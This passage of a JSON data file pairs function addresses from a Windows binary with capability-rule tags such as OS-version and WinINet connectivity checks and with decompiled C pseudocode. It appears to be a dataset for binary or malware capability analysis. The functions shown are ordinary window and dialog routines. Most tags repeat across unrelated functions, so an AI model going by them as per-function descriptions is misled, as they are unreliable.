arg_ch >> 0x18;\n    }\n    return puVar2;\n}\n",
        "token_count": 405
    },
    "00435340": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435340(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_10h;\n    int32_t iVar1;\n    \n    if ((arg_ch != 0) && (arg_8h != 0)) {\n        if ((~*(in_ECX + 0x18) & 1) == 0) {\n            fcn.0043586f(2, *(in_ECX + 0x14));\n        }\n        arg_10h = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        if (arg_ch < arg_10h) {\n            arg_10h = arg_ch;\n        }\n        fcn.00411970(*(in_ECX + 0x28), arg_8h, arg_10h);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + arg_10h;\n        arg_ch = arg_ch - arg_10h;\n        if (arg_ch != 0) {\n            fcn.00434f6a();\n            iVar1 = arg_ch - arg_ch % *(in_ECX + 0x20);\n            (**(**(in_ECX + 0x24) + 0x38))(arg_8h + arg_10h, iVar1);\n            if (*(in_ECX + 8) != 0) {\n                (**(**(in_ECX + 0x24) + 0x50))(1, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                *(in_ECX + 0x28) = *(in_ECX + 0x30);\n            }\n            fcn.00411970(*(in_ECX + 0x28), arg_8h + arg_10h + iVar1, arg_ch - iVar1);\n            *(in_ECX + 0x28) = *(in_ECX + 0x28) + (arg_ch - iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 469
    },
    "004355b7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004355b7(void)\n\n{\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    if ((*(extraout_ECX + 0x24) != 0) && ((*(extraout_ECX + 0x18) & 2) == 0)) {\n        fcn.00435332();\n    }\n    fcn.00434dfb();\n    fcn.00401200();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 201
    },
    "00435c65": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nint32_t __cdecl fcn.00435c65(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t arg_8h_00;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    int32_t in_stack_ffffffd0;\n    int32_t in_stack_ffffffd4;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    if ((*(arg_8h_00 + 0x18) & 1) == 0) goto code_r0x00435e2d;\n    if ((*(unaff_EBP + 8) != 0) && (*(*(unaff_EBP + 8) + 8) == 0xffff)) {\n        fcn.00422e47();\n    }\n    fcn.00435ab6(0);\n    fcn.0040dca8(unaff_EBP + -0x10);\n    if (*(unaff_EBP + -0x10) == 0x7fff) {\n        fcn.0040dceb(unaff_EBP + -0x18);\n        uVar5 = *(unaff_EBP + -0x18);\n    }\n    else {\n        uVar5 = (*(unaff_EBP + -0x10) & 0xffff8000) << 0x10 | *(unaff_EBP + -0x10) & 0xffff7fff;\n        *(unaff_EBP + -0x18) = uVar5;\n    }\n    if (-1 < uVar5) {\n        if (*(unaff_EBP + 0x10) != NULL) {\n            **(unaff_EBP + 0x10) = uVar5;\n            iVar7 = 0;\n            goto code_r0x00435cf6;\n        }\ncode_r0x00435e28:\n        in_stack_ffffffd4 = *(arg_8h_00 + 0x14);\n        in_stack_ffffffd0 = 5;\n        goto code_r0x00435e2d;\n    }\n    if (*(unaff_EBP + -0x10) != -1) {\n        uVar5 = uVar5 & 0x7fffffff;\n        if ((uVar5 == 0) || (*(*(arg_8h_00 + 0x38) + 8) - 1U < uVar5)) goto code_r0x00435e28;\n        iVar7 = fcn.0040fc82(uVar5);\n        iVar2 = *(arg_8h_00 + 0x3c);\n        *(unaff_EBP + -0x14) = 0;\n        if ((iVar2 == 0) || (iVar2 = fcn.00427e36(iVar7, unaff_EBP + -0x1c),  iVar2 == 0)) {\n            uVar6 = *(iVar7 + 8) & 0x7fffffff;\n        }\n        else {\n            uVar6 = *(unaff_EBP + -0x1c);\n        }\n        uVar5 = *(unaff_EBP + -0x18);\n        *(unaff_EBP + -0x14) = uVar6;\ncode_r0x00435def:\n        if (*(unaff_EBP + 8) != 0) {\n            iVar2 = fcn.0042ff7a(*(unaff_EBP + 8));\n            if (iVar2 == 0) goto code_r0x00435d21;\n            uVar6 = *(unaff_EBP + -0x14);\n        }\n        if (*(unaff_EBP + 0xc) == NULL) {\n            *(arg_8h_00 + 0x10) = uVar6;\n        }\n        else {\n            **(unaff_EBP + 0xc) = uVar6;\n        }\n        if (*(unaff_EBP + 0x10) != NULL) {\n            **(unaff_EBP + 0x10) = uVar5;\n        }\ncode_r0x00435cf6:\n        *in_FS_OFFSET = *(unaff_EBP + -0xc);\n        return iVar7;\n    }\n    in_stack_ffffffd4 = unaff_EBP + -0x14;\n    in_stack_ffffffd0 = arg_8h_00;\n    iVar7 = fcn.004352c3(arg_8h_00, in_stack_ffffffd4);\n    if (iVar7 != 0) {\n        if ((*(iVar7 + 8) & 0x7fffffff) != *(unaff_EBP + -0x14)) {\n            if (-1 < *(iVar7 + 8)) goto code_r0x00435e2d;\n            if (*(arg_8h_00 + 0x3c) == 0) {\n                iVar2 = fcn.0042eabb(0x1c);\n                *(unaff_EBP + -0x1c) = iVar2;\n                *(unaff_EBP + -4) = 0;\n                if (iVar2 == 0) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = fcn.00427f1a(10);\n                }\n                *(unaff_EBP + -4) = 0xffffffff;\n                *(arg_8h_00 + 0x3c) = uVar3;\n            }\n            uVar3 = *(unaff_EBP + -0x14);\n            puVar4 = fcn.00427f9e(iVar7);\n            *puVar4 = uVar3;\n            uVar5 = *(unaff_EBP + -0x18);\n        }\n        fcn.00435aa2();\n        iVar2 = *(arg_8h_00 + 0x34);\n        *(arg_8h_00 + 0x34) = iVar2 + 1;\n        fcn.0042782d(iVar2, iVar7, 1);\n        uVar6 = *(unaff_EBP + -0x14);\n        goto code_r0x00435def;\n    }\ncode_r0x00435d21:\n    in_stack_ffffffd4 = *(arg_8h_00 + 0x14);\n    in_stack_ffffffd0 = 6;\ncode_r0x00435e2d:\n    fcn.0043586f(in_stack_ffffffd0, in_stack_ffffffd4);\n    pcVar1 = swi(3);\n    iVar7 = (*pcVar1)();\n    return iVar7;\n}\n",
        "token_count": 1582
    },
    "00435eea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00435eea(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t in_ECX;\n    uint in_stack_ffffffd0;\n    uint in_stack_ffffffd4;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_8h = in_ECX;\n    if ((*(in_ECX + 0x18) & 1) != 0) {\n        var_4h = in_ECX;\n        iVar2 = fcn.00435c65(arg_8h, &var_8h, &var_4h);\n        if (iVar2 != 0) goto code_r0x00435f55;\n        if (var_4h <= *(*(in_ECX + 0x38) + 8) - 1U) {\n            piVar3 = fcn.0040fc82(var_4h);\n            if (piVar3 == NULL) {\n                return NULL;\n            }\n            if (arg_8h == 0) {\n                return piVar3;\n            }\n            iVar2 = fcn.0042ffa1(arg_8h);\n            if (iVar2 != 0) {\n                return piVar3;\n            }\n            in_stack_ffffffd4 = *(in_ECX + 0x14);\n            in_stack_ffffffd0 = 6;\n        }\n    }\n    fcn.0043586f(in_stack_ffffffd0, in_stack_ffffffd4);\ncode_r0x00435f55:\n    piVar3 = fcn.0042ff21();\n    if (piVar3 == NULL) {\n        fcn.00422e2d();\n    }\n    fcn.00435aa2();\n    iVar2 = *(in_ECX + 0x34);\n    *(in_ECX + 0x34) = iVar2 + 1;\n    fcn.0042782d(iVar2, piVar3, 1);\n    uVar1 = *(in_ECX + 0x10);\n    *(in_ECX + 0x10) = var_8h;\n    (**(*piVar3 + 8))();\n    *(in_ECX + 0x10) = uVar1;\n    return piVar3;\n}\n",
        "token_count": 519
    },
    "00436308": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00436308(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBX;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    uVar2 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 0x1c));\n    uVar2 = fcn.0042b432(uVar2);\n    iVar3 = fcn.0042ffa1(0x454ce8);\n    if (iVar3 != 0) {\n        if (unaff_EBX != 0) {\n            return uVar2;\n        }\n        do {\n            uVar4 = (*pcVar1)(*(param_1 + 0x1c));\n            param_1 = fcn.0042b432(uVar4);\n            if (param_1 == 0) {\n                return uVar2;\n            }\n            iVar3 = (*_sym.imp.USER32.dll_IsIconic)(*(param_1 + 0x1c));\n        } while (iVar3 == 0);\n    }\n    return 0;\n}\n",
        "token_count": 259
    },
    "00436628": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00436628(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    var_4h = (**(*param_1 + 0x60))();\n    do {\n        if (var_4h == NULL) {\n            uVar2 = (**(*param_1 + 0x90))();\n            return uVar2;\n        }\n        (**(*param_1 + 100))(&var_4h);\n        iVar1 = fcn.0042bedc();\n    } while ((iVar1 == 0) || (*(iVar1 + 0x54) < 1));\n    return 1;\n}\n",
        "token_count": 168
    },
    "0043671d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043671d(int32_t *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    int32_t var_4h;\n    \n    var_4h = (**(*in_ECX + 0x60))();\n    while (var_4h != 0) {\n        piVar1 = (**(*in_ECX + 100))(&var_4h);\n        if (piVar1 != arg_8h) {\n            (**(*piVar1 + 0x164))(arg_8h, arg_ch, arg_10h);\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0043675e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043675e(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    var_4h = (**(*param_1 + 0x60))();\n    while (var_4h != NULL) {\n        piVar1 = (**(*param_1 + 100))(&var_4h);\n        (**(*piVar1 + 0x158))();\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "004367d3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004367d3(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x34);\n    while (iVar1 != 0) {\n        iVar1 = fcn.00426f76();\n        *(iVar1 + 0x50) = 0;\n        iVar1 = *(param_1 + 0x34);\n    }\n    return;\n}\n",
        "token_count": 97
    },
    "0043680d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043680d(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    var_4h = (**(*param_1 + 0x60))();\n    while (var_4h != NULL) {\n        iVar1 = (**(*param_1 + 100))(&var_4h);\n        iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x1c));\n        if ((iVar1 != 0) && (iVar1 = fcn.0042bedc(),  iVar1 != 0)) {\n            *(iVar1 + 0x54) = 0xffffffff;\n        }\n    }\n    var_8h = 0;\n    var_4h = (**(*param_1 + 0x60))();\n    while (var_4h != NULL) {\n        iVar1 = (**(*param_1 + 100))(&var_4h);\n        iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x1c));\n        if (((iVar1 != 0) && (iVar1 = fcn.0042bedc(),  iVar1 != 0)) && (*(iVar1 + 0x54) == -1)) {\n            var_8h = var_8h + 1;\n            *(iVar1 + 0x54) = var_8h;\n        }\n    }\n    iVar1 = 1;\n    var_4h = (**(*param_1 + 0x60))();\n    while (var_4h != NULL) {\n        iVar2 = (**(*param_1 + 100))(&var_4h);\n        iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar2 + 0x1c));\n        if (((iVar2 != 0) && (piVar3 = fcn.0042bedc(),  piVar3 != NULL)) && (piVar3[0x15] == iVar1)) {\n            if (var_8h == 1) {\n                piVar3[0x15] = 0;\n            }\n            (**(*piVar3 + 0x15c))(1);\n            iVar1 = iVar1 + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 540
    },
    "00436ce9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436ce9(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    uint var_208h;\n    uint var_108h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h);\n    if (iVar1 < 0x104) {\n        iVar1 = fcn.00431946(&var_108h, arg_8h);\n        if (iVar1 != 0) goto code_r0x00436d2c;\n    }\n    fcn.0043236d(3, 0xffffffff, 0);\ncode_r0x00436d2c:\n    fcn.00401c20(&var_108h);\n    in_ECX[0x13] = 0;\n    iVar1 = fcn.00431676(&var_108h, &var_208h, 0x100);\n    if (iVar1 == 0) {\n        (**(*in_ECX + 0x50))(&var_208h);\n    }\n    if (arg_ch != 0) {\n        iVar1 = fcn.00444bf8();\n        (**(**(iVar1 + 4) + 0x8c))(in_ECX[8]);\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 324
    },
    "004375fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004375fd(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    iVar1 = arg_8h;\n    fcn.0042dbd3(arg_8h, &arg_8h);\n    if (arg_8h == 0) {\n        iVar2 = fcn.0042db52(iVar1);\n        if (iVar2 == 0) {\n            fcn.00422e47();\n        }\n    }\n    *(in_ECX + 0xc) = 0;\n    *(in_ECX + 8) = iVar1;\n    return arg_8h;\n}\n",
        "token_count": 158
    },
    "0043763c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043763c(int32_t *param_1)\n\n{\n    int32_t *hWnd;\n    \n    hWnd = param_1;\n    if ((*param_1 != 0) && (param_1[2] != 0)) {\n        fcn.0042dbd3(param_1[2], &hWnd);\n        if (hWnd != NULL) {\n            (*_sym.imp.USER32.dll_SetFocus)(hWnd);\n            if (param_1[3] != 0) {\n                (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0xb1, 0, 0xffffffff);\n            }\n        }\n    }\n    fcn.00433064();\n    return;\n}\n",
        "token_count": 160
    },
    "0043768b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043768b(int32_t *hWnd, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = hWnd;\n    fcn.004375fd(arg_ch);\n    fcn.0042dbd3(arg_ch, &hWnd);\n    if (*piVar1 == 0) {\n        if ((*arg_10h < 0) || (2 < *arg_10h)) {\n            *arg_10h = 0;\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0xf1, *arg_10h, 0);\n    }\n    else {\n        iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(hWnd, 0xf0, 0, 0);\n        *arg_10h = iVar2;\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "00437841": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437841(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    \n    piVar1 = arg_8h;\n    fcn.004375fd(arg_ch);\n    fcn.0042dbd3(arg_ch, &arg_8h);\n    if (*piVar1 == 0) {\n        (*_sym.imp.USER32.dll_SetScrollPos)(arg_8h, 2, *arg_10h, 1);\n    }\n    else {\n        uVar2 = (*_sym.imp.USER32.dll_GetScrollPos)(arg_8h, 2);\n        *arg_10h = uVar2;\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "00437930": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437930(int32_t *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = arg_14h;\n    uVar2 = arg_10h;\n    if ((*arg_8h != 0) || ((arg_10h <= arg_ch && (arg_ch <= arg_14h)))) {\n        fcn.0042dbd3(arg_8h[2], &arg_ch);\n        pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n        (*_sym.imp.USER32.dll_SendMessageA)(arg_ch, 0x407, 0, uVar2);\n        (*pcVar1)(arg_ch, 0x407, 1, uVar3);\n    }\n    return;\n}\n",
        "token_count": 206
    },
    "00437981": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437981(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar2 = arg_10h;\n    if (*(arg_10h + 0x1c) != 0) {\n        return;\n    }\n    iVar1 = fcn.0042db30();\n    if (iVar1 != 0) {\n        return;\n    }\n    fcn.004375fd(arg_ch);\n    fcn.0042dbd3(arg_ch, &arg_10h);\n    if (arg_10h != 0) {\n        iVar1 = fcn.0042c34a(arg_10h);\n        if (iVar1 == 0) {\n            fcn.00422e47();\n        }\n        if (arg_10h != 0) {\n            iVar1 = *(arg_8h + 4);\n            iVar2 = (*_sym.imp.USER32.dll_GetParent)(*(iVar2 + 0x1c));\n            if (*(iVar1 + 0x1c) == iVar2) {\n                return;\n            }\n            arg_ch = 0;\n            goto code_r0x004379fc;\n        }\n    }\n    iVar2 = fcn.0042db52(arg_ch);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar1 = *(arg_8h + 4);\ncode_r0x004379fc:\n    fcn.0042df63(iVar1, arg_ch);\n    return;\n}\n",
        "token_count": 345
    },
    "00437a21": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437a21(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint arg_10h_00;\n    uint hWnd;\n    int32_t iVar1;\n    uint lpString;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    hWnd = fcn.00437a0a(arg_ch);\n    arg_10h_00 = arg_18h;\n    if (*arg_8h == 0) {\n        fcn.00410ef1(&lpString, arg_10h, &arg_18h);\n        fcn.00434b8c(hWnd, &lpString);\n    }\n    else {\n        (*_sym.imp.USER32.dll_GetWindowTextA)(hWnd, &lpString, 0x40);\n        iVar1 = fcn.00410ebd(&lpString, arg_10h, arg_10h_00);\n        if (iVar1 != 1) {\n            fcn.00438754(arg_14h, 0, 0xffffffff);\n            fcn.0043763c();\n        }\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 278
    },
    "00437aaa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437aaa(int32_t *arg_8h, uint arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t *puVar1;\n    \n    puVar1 = arg_10h;\n    arg_10h = *arg_10h;\n    if (*arg_8h == 0) {\n        fcn.00437a21(arg_8h, arg_ch, 0x450a74, 0xf116, arg_10h);\n    }\n    else {\n        fcn.00437a21(arg_8h, arg_ch, 0x450a74, 0xf116, &arg_10h);\n        if (0xff < arg_10h) {\n            fcn.00438754(0xf116, 0, 0xffffffff);\n            fcn.0043763c();\n        }\n        *puVar1 = arg_10h;\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "00437b1b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437b1b(int32_t *arg_8h, uint arg_ch, int16_t *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.00437a21(arg_8h, arg_ch, 0x450a78, 0xf110, arg_10h);\n    return;\n}\n",
        "token_count": 98
    },
    "00437b4c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437b4c(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.00437a21(arg_8h, arg_ch, 0x44e928, 0xf110, arg_10h);\n    return;\n}\n",
        "token_count": 96
    },
    "00437b7b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437b7b(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.00437a21(arg_8h, arg_ch, 0x450a74, 0xf117, arg_10h);\n    return;\n}\n",
        "token_count": 96
    },
    "00437baa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437baa(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.00437a21(arg_8h, arg_ch, 0x450a7c, 0xf110, arg_10h);\n    return;\n}\n",
        "token_count": 96
    },
    "00437bd9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437bd9(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        arg_10h = *arg_10h;\n    }\n    fcn.00437a21(arg_8h, arg_ch, 0x450a80, 0xf117, arg_10h);\n    return;\n}\n",
        "token_count": 95
    },
    "00437c08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437c08(int32_t *arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    if (*arg_8h == 0) {\n        fcn.00437a21(arg_8h, arg_ch, \"%I64d\", 0xf110, *arg_10h);\n    }\n    else {\n        fcn.00437a21(arg_8h, arg_ch, \"%I64d\", 0xf110, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 118
    },
    "00437c50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
